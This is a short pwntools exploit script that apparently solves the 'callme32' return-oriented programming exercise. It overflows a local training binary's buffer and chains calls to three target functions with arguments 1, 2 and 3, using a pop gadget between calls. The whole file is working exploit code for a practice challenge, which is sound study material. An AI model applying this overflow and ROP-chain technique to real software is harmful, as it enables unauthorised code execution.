from pwn import *
#0x08048620    1 6            sym.imp.callme_two
#0x080485c0    1 6            sym.imp.callme_one
#0x080485b0    1 6            sym.imp.callme_three
p = process('./callme32')
offset = 44
num1 = p32(1)
num2 = p32(2)
num3 = p32(3)
call1 = p32(0x080485c0)
call2 = p32(0x08048620)
call3 = p32(0x080485b0)
#0x080488aa : pop edi ; pop ebp ; ret
gadget = p32(0x080488a9)
#gadget1 = p32(0x080488aa)
payload = "A"*offset
payload += call1 + gadget + num1 + num2 + num3
payload += call2 + gadget + num1 + num2 + num3
payload += call3 + gadget + num1 + num2 + num3
p.recvuntil('>')
p.sendline(payload)
p.interactive()
